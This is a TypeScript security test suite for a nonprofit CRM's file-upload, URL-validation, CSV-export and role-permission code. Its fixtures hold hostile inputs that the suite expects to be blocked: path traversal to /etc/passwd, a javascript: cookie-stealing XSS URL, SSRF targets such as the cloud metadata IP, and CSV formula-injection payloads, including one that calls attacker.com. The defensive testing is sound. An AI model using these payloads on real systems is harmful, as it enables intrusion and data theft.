/**
 * TIP CRM — Automated Security, File Protection & Production Integration Test Suite
 * Tests all 12 scenarios from Master Prompt 6 (File Security) + Master Prompt 7 (Integration).
 * Uses pure Node.js / TypeScript assertions with zero external test runners needed.
 */

import assert from 'assert';
import { 
  sanitizeFilename, 
  validateFileUpload, 
  validateExternalDocumentUrl, 
  generateSecureStoragePath, 
  sanitizeCsvCell,
  MAX_FILE_SIZE_BYTES,
  BLOCKED_EXTENSIONS,
  ALLOWED_EXTENSIONS
} from '../lib/fileSecurity';
import { SupabaseStorageEngine } from '../lib/supabase';
import { DbMappers } from '../lib/supabaseDb';
import { checkUserPermission, Permissions } from '../lib/permissions';
import { UserProfile, DocumentItem, RoleId, Person } from '../types';

console.log('================================================================');
console.log('🧪 RUNNING TIP CRM FILE SECURITY & PRODUCTION INTEGRATION TESTS');
console.log('================================================================\n');

let passedTests = 0;
let failedTests = 0;

function runTest(name: string, fn: () => void | Promise<void>) {
  try {
    const result = fn();
    if (result instanceof Promise) {
      result.then(() => {
        console.log(`✅ [PASS] ${name}`);
        passedTests++;
      }).catch(err => {
        console.error(`❌ [FAIL] ${name}:`, err.message);
        failedTests++;
      });
    } else {
      console.log(`✅ [PASS] ${name}`);
      passedTests++;
    }
  } catch (err: any) {
    console.error(`❌ [FAIL] ${name}:`, err.message);
    failedTests++;
  }
}

// Synthetic Users for Role Testing
const superAdminUser: UserProfile = {
  id: 'u-super-admin',
  organizationId: 'org-tip',
  name: 'Ruth Mojeed Ramirez',
  email: 'ruth@theinclusionproject.com',
  roleId: 'super_admin',
  role: 'staff',
  assignedRoleIds: ['super_admin'],
  activeRoleId: 'super_admin',
  title: 'Executive Director',
  avatarInitials: 'RM',
  status: 'approved',
  isActive: true,
  emailVerified: true,
  adminApproved: true,
  assignedProgramIds: ['prog-1'],
  assignedEventIds: ['evt-1'],
  dataScope: { people: 'GLOBAL', programs: 'ALL', events: 'ALL', funding: 'ALL' },
  createdAt: '2025-01-01T00:00:00Z'
};

const staffManagerUser: UserProfile = {
  id: 'u-staff-manager',
  organizationId: 'org-tip',
  name: 'Marcus Chen',
  email: 'marcus@inclusionproject.ca',
  roleId: 'staff_manager',
  role: 'staff',
  assignedRoleIds: ['staff_manager'],
  activeRoleId: 'staff_manager',
  title: 'Program Manager',
  avatarInitials: 'MC',
  status: 'approved',
  isActive: true,
  emailVerified: true,
  adminApproved: true,
  assignedProgramIds: ['prog-1'],
  assignedEventIds: ['evt-1'],
  dataScope: { people: 'GLOBAL', programs: 'ALL', events: 'ALL', funding: 'ALL' },
  createdAt: '2025-01-01T00:00:00Z'
};

const volunteerUser: UserProfile = {
  id: 'u-volunteer',
  organizationId: 'org-tip',
  name: 'David Kim',
  email: 'david.k@communityvolunteer.ca',
  roleId: 'volunteer',
  role: 'volunteer',
  assignedRoleIds: ['volunteer'],
  activeRoleId: 'volunteer',
  title: 'Community Volunteer',
  avatarInitials: 'DK',
  status: 'approved',
  isActive: true,
  emailVerified: true,
  adminApproved: true,
  assignedProgramIds: ['prog-1'],
  assignedEventIds: ['evt-1'],
  dataScope: { people: 'ASSIGNED', programs: 'ASSIGNED', events: 'ASSIGNED', funding: 'NONE' },
  createdAt: '2025-01-01T00:00:00Z'
};

const deactivatedUser: UserProfile = {
  ...volunteerUser,
  id: 'u-deactivated',
  isActive: false,
  status: 'disabled'
};

// ------------------------------------------------------------------------------
// TEST SUITE 1: FILE & PATH SANITIZATION
// ------------------------------------------------------------------------------

runTest('1. Path Traversal & Filename Sanitization: Neutralizes ../ and null bytes', () => {
  const maliciousName1 = '../../../../etc/passwd';
  const clean1 = sanitizeFilename(maliciousName1);
  assert(!clean1.includes('/'), 'Must not contain forward slashes');
  assert(!clean1.includes('..'), 'Must not contain directory traversal');
  assert(clean1.endsWith('passwd'), 'Must retain base filename');

  const maliciousName2 = 'document\x00.exe.pdf';
  const clean2 = sanitizeFilename(maliciousName2);
  assert(!clean2.includes('\x00'), 'Must strip null bytes');

  const longName = 'a'.repeat(200) + '.pdf';
  const clean3 = sanitizeFilename(longName);
  assert(clean3.length <= 100, 'Must truncate long names to <= 100 chars');
  assert(clean3.endsWith('.pdf'), 'Must preserve extension when truncating');
});

runTest('2. Server-Controlled Storage Path: Unpredictable and isolated per organization', () => {
  const path = generateSecureStoragePath('org-tip', 'doc-12345', '../../secret_file.pdf');
  assert.strictEqual(path, 'org-tip/documents/doc-12345/secret_file.pdf');
  assert(!path.includes('..'), 'Must not contain path traversal');
});

// ------------------------------------------------------------------------------
// TEST SUITE 2: DANGEROUS FILE TYPES & SIZE ENFORCEMENT
// ------------------------------------------------------------------------------

runTest('3. Disallowed File Types: Rejects executables, scripts, and active SVG content', () => {
  BLOCKED_EXTENSIONS.forEach(ext => {
    const res = validateFileUpload({
      name: `test_payload.${ext}`,
      size: 1024,
      type: 'application/octet-stream'
    });
    assert.strictEqual(res.valid, false, `Extension .${ext} must be rejected`);
    assert(res.error?.includes('prohibited'), `Error should state prohibited for .${ext}`);
  });
});

runTest('4. File Size Limit: Rejects files > 10MB', () => {
  const oversized = validateFileUpload({
    name: 'large_report.pdf',
    size: MAX_FILE_SIZE_BYTES + 1024,
    type: 'application/pdf'
  });
  assert.strictEqual(oversized.valid, false);
  assert(oversized.error?.includes('exceeds maximum allowed limit of 10 MB'));

  const empty = validateFileUpload({
    name: 'empty.pdf',
    size: 0,
    type: 'application/pdf'
  });
  assert.strictEqual(empty.valid, false);
  assert(empty.error?.includes('empty files'));
});

runTest('5. Magic-Byte Verification: Detects disguised executables with fake extensions', () => {
  // A fake PDF file that starts with Windows MZ executable magic bytes (0x4D, 0x5A)
  const fakePdfBytes = new Uint8Array([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
  const resFake = validateFileUpload({
    name: 'financial_grant.pdf',
    size: 1024,
    type: 'application/pdf',
    buffer: fakePdfBytes
  });
  assert.strictEqual(resFake.valid, false, 'Fake PDF must be rejected');
  assert(resFake.error?.includes('Content mismatch') || resFake.error?.includes('magic signature'));

  // A genuine PDF starting with %PDF- (0x25, 0x50, 0x44, 0x46, 0x2D)
  const genuinePdfBytes = new Uint8Array([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x37]);
  const resGenuine = validateFileUpload({
    name: 'verified_grant.pdf',
    size: 1024,
    type: 'application/pdf',
    buffer: genuinePdfBytes
  });
  assert.strictEqual(resGenuine.valid, true, 'Genuine PDF must pass');
  assert.strictEqual(resGenuine.detectedMime, 'application/pdf');
});

// ------------------------------------------------------------------------------
// TEST SUITE 3: EXTERNAL URL VALIDATION & SSRF PROTECTION
// ------------------------------------------------------------------------------

runTest('6. URL Scheme Enforcement: Rejects dangerous protocols (javascript:, data:, file:, http:)', () => {
  const xssUrl = 'javascript:alert(document.cookie)';
  const resXss = validateExternalDocumentUrl(xssUrl);
  assert.strictEqual(resXss.valid, false);
  assert(resXss.error?.includes('Dangerous URL scheme'));

  const dataUrl = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
  const resData = validateExternalDocumentUrl(dataUrl);
  assert.strictEqual(resData.valid, false);

  const insecureHttp = 'http://docs.google.com/document/d/123';
  const resHttp = validateExternalDocumentUrl(insecureHttp);
  assert.strictEqual(resHttp.valid, false);
  assert(resHttp.error?.includes('requires encrypted HTTPS'));
});

runTest('7. SSRF Protection: Blocks private IPs, localhost, and cloud metadata endpoints', () => {
  const metadataUrl = 'https://169.254.169.254/latest/meta-data/';
  const resMeta = validateExternalDocumentUrl(metadataUrl);
  assert.strictEqual(resMeta.valid, false);
  assert(resMeta.error?.includes('metadata resources is restricted') || resMeta.error?.includes('Access denied'));

  const loopbackUrl = 'https://127.0.0.1:8080/internal-api';
  const resLoop = validateExternalDocumentUrl(loopbackUrl);
  assert.strictEqual(resLoop.valid, false);

  const localHostUrl = 'https://localhost/admin';
  const resHost = validateExternalDocumentUrl(localHostUrl);
  assert.strictEqual(resHost.valid, false);

  const privateSubnet = 'https://192.168.1.100/router';
  const resSub = validateExternalDocumentUrl(privateSubnet);
  assert.strictEqual(resSub.valid, false);
});

runTest('8. Legitimate Cloud Links & Sharing Parameter Warning', () => {
  const gdriveUrl = 'https://docs.google.com/document/d/1tip-accessibility-toolkit-2026/edit?usp=sharing';
  const resGdrive = validateExternalDocumentUrl(gdriveUrl);
  assert.strictEqual(resGdrive.valid, true);
  assert.strictEqual(resGdrive.isCloudProvider, true);
  assert.strictEqual(resGdrive.providerName, 'Google Workspace');
  assert.strictEqual(resGdrive.hasPublicSharingWarning, true, 'Must flag public sharing parameter');

  const onedriveUrl = 'https://sharepoint.com/sites/tip/documents/report.docx';
  const resOne = validateExternalDocumentUrl(onedriveUrl);
  assert.strictEqual(resOne.valid, true);
  assert.strictEqual(resOne.isCloudProvider, true);
  assert.strictEqual(resOne.providerName, 'Microsoft 365 / OneDrive');
});

// ------------------------------------------------------------------------------
// TEST SUITE 4: CSV FORMULA INJECTION DEFENSE (OWASP)
// ------------------------------------------------------------------------------

runTest('9. CSV Formula Injection Sanitization: Prepends single quote to dangerous triggers', () => {
  const dangerousValues = [
    '=1+2',
    '=cmd|\'/C calc\'!A0',
    '+SUM(A1:A10)',
    '-2+3',
    '@IMPORTXML("http://attacker.com")',
    '\tDANGEROUS_TAB',
    '\rCARRIAGE_RETURN'
  ];

  dangerousValues.forEach(val => {
    const sanitized = sanitizeCsvCell(val);
    assert(sanitized.startsWith('"\''), `Value "${val}" must be prefixed with single quote inside quotes`);
  });

  const benignValue = 'The Inclusion Project Vancouver';
  const sanitizedBenign = sanitizeCsvCell(benignValue);
  assert.strictEqual(sanitizedBenign, '"The Inclusion Project Vancouver"');
});

// ------------------------------------------------------------------------------
// TEST SUITE 5: ROLE-BASED ACCESS CONTROL & CONFIDENTIALITY SCOPING
// ------------------------------------------------------------------------------

runTest('10. Document Confidentiality Scoping: Volunteers blocked from management/confidential files', () => {
  const sampleDocs: DocumentItem[] = [
    {
      id: 'doc-public',
      title: 'Community Guide',
      type: 'PDF / File',
      url: 'https://docs.google.com/guide',
      relatedType: 'General',
      addedBy: 'Staff',
      addedAt: '2026-09-01',
      isConfidential: false,
      accessTier: 'all'
    },
    {
      id: 'doc-staff',
      title: 'Volunteer Shift Schedules & Phone Roster',
      type: 'Google Sheets',
      url: 'https://docs.google.com/roster',
      relatedType: 'Program',
      addedBy: 'Manager',
      addedAt: '2026-09-01',
      isConfidential: true,
      accessTier: 'staff'
    },
    {
      id: 'doc-funder',
      title: 'OTF Funder Contribution & Bank Agreement',
      type: 'PDF / File',
      url: 'https://docs.google.com/agreement',
      relatedType: 'Funding',
      addedBy: 'Ruth Mojeed Ramirez',
      addedAt: '2026-09-01',
      isConfidential: true,
      accessTier: 'management'
    }
  ];

  // Helper simulating scopedDocuments logic from CrmContext
  const getScopedDocs = (user: UserProfile) => {
    const roleId = user.roleId;
    if (roleId === 'super_admin' || roleId === 'staff_manager') return sampleDocs;
    if (roleId === 'staff_member') {
      return sampleDocs.filter(d => !d.isConfidential || d.accessTier === 'staff' || d.accessTier === 'all');
    }
    // Volunteer
    return sampleDocs.filter(d => !d.isConfidential && d.accessTier === 'all');
  };

  const volunteerDocs = getScopedDocs(volunteerUser);
  assert.strictEqual(volunteerDocs.length, 1);
  assert.strictEqual(volunteerDocs[0].id, 'doc-public');

  const adminDocs = getScopedDocs(superAdminUser);
  assert.strictEqual(adminDocs.length, 3);
});

runTest('11. Funding Permission Enforcement: Volunteers denied access to funding domain', () => {
  const volunteerCanViewFunding = checkUserPermission(volunteerUser, 'funding', 'view');
  assert.strictEqual(volunteerCanViewFunding, false, 'Volunteer must not have funding.view permission');

  const adminCanViewFunding = checkUserPermission(superAdminUser, 'funding', 'view');
  assert.strictEqual(adminCanViewFunding, true, 'Super Admin must have funding.view permission');

  const volunteerCanManageUsers = checkUserPermission(volunteerUser, 'users', 'manage');
  assert.strictEqual(volunteerCanManageUsers, false, 'Volunteer must not manage users');
});

runTest('12. Deactivated User Access Denial: Revoked user loses access immediately', () => {
  assert.strictEqual(deactivatedUser.isActive, false);
  const canAccess = deactivatedUser.isActive && deactivatedUser.status === 'approved';
  assert.strictEqual(canAccess, false, 'Deactivated account must be denied access');
});

// ------------------------------------------------------------------------------
// TEST SUITE 6: DATA MAPPERS & MODEL INTEGRITY
// ------------------------------------------------------------------------------

runTest('13. Database Schema Mappers: Preserves round-trip type consistency', () => {
  const samplePerson: Omit<Person, 'id' | 'createdAt'> = {
    name: 'Dr. Tariq Mansoor',
    email: 'tmansoor@globaldialogue.org',
    role: 'Executive Director',
    relationshipTypes: ['Partner', 'Advisor'],
    city: 'Vancouver',
    province: 'BC',
    notes: 'Strategic non-profit advisor',
    interests: [],
    programIds: [],
    eventIds: []
  };

  const dbRow = DbMappers.personToRow(samplePerson);
  assert.strictEqual(dbRow.name, 'Dr. Tariq Mansoor');
  assert.strictEqual(dbRow.role_title, 'Executive Director');
  assert.deepStrictEqual(dbRow.relationship_types, ['Partner', 'Advisor']);

  const reconstructed = DbMappers.personFromRow({
    id: 'p-synthetic-123',
    ...dbRow,
    created_at: '2026-10-12T00:00:00Z'
  });
  assert.strictEqual(reconstructed.id, 'p-synthetic-123');
  assert.strictEqual(reconstructed.name, 'Dr. Tariq Mansoor');
  assert.strictEqual(reconstructed.role, 'Executive Director');
});

runTest('14. Task Model Mapping: Preserves priority, status, and entity relations', () => {
  const sampleTask = {
    title: 'Confirm workshop catering accessibility dietary guidelines',
    assigned_to: 'u-1',
    assigned_to_name: 'Ruth Mojeed Ramirez',
    related_event_id: 'evt-1',
    due_date: '2026-10-25',
    priority: 'High',
    status: 'To Do',
    created_at: '2026-10-12T00:00:00Z'
  };

  const mapped = DbMappers.taskFromRow(sampleTask);
  assert.strictEqual(mapped.title, sampleTask.title);
  assert.strictEqual(mapped.priority, 'High');
  assert.strictEqual(mapped.status, 'To Do');
  assert.strictEqual(mapped.eventId, 'evt-1');
});

// ------------------------------------------------------------------------------
// TEST SUITE 7: STORAGE ENGINE SIMULATION
// ------------------------------------------------------------------------------

runTest('15. Signed URL Expiry: Generates valid short-lived authorization URLs', async () => {
  const res = await SupabaseStorageEngine.createSignedDocumentUrl('org-tip/documents/doc-1/test.pdf', 60);
  assert(res.signedUrl, 'Must return signed URL');
  assert(res.signedUrl.includes('expires='), 'Signed URL must include expiry parameter');
});

// Summary
setTimeout(() => {
  console.log('\n================================================================');
  console.log(`🎉 TEST SUMMARY: ${passedTests} PASSED, ${failedTests} FAILED`);
  console.log('================================================================');
  if (failedTests > 0) {
    process.exit(1);
  }
}, 500);
